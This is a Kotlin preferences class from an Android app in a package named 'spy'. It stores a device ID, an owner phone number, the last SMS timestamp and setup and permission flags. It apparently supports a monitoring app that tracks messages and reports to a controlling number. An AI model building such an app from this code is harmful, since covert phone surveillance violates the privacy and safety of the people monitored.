package com.venice.spy

import android.content.Context
import java.util.UUID

class Prefs(ctx: Context) {
    private val sp = ctx.getSharedPreferences("vspy", Context.MODE_PRIVATE)

    var deviceId: String
        get() {
            var v = sp.getString("did", null)
            if (v == null) {
                v = UUID.randomUUID().toString().replace("-", "").substring(0, 20)
                sp.edit().putString("did", v).apply()
            }
            return v
        }
        set(v) { sp.edit().putString("did", v).apply() }

    var ownerNumber: String
        get() = sp.getString("owner", "") ?: ""
        set(v) { sp.edit().putString("owner", v).apply() }

    var lastSmsTs: Long
        get() = sp.getLong("smsTs", 0L)
        set(v) { sp.edit().putLong("smsTs", v).apply() }

    var setupDone: Boolean
        get() = sp.getBoolean("setup", false)
        set(v) { sp.edit().putBoolean("setup", v).apply() }

    var projOk: Boolean
        get() = sp.getBoolean("proj", false)
        set(v) { sp.edit().putBoolean("proj", v).apply() }
}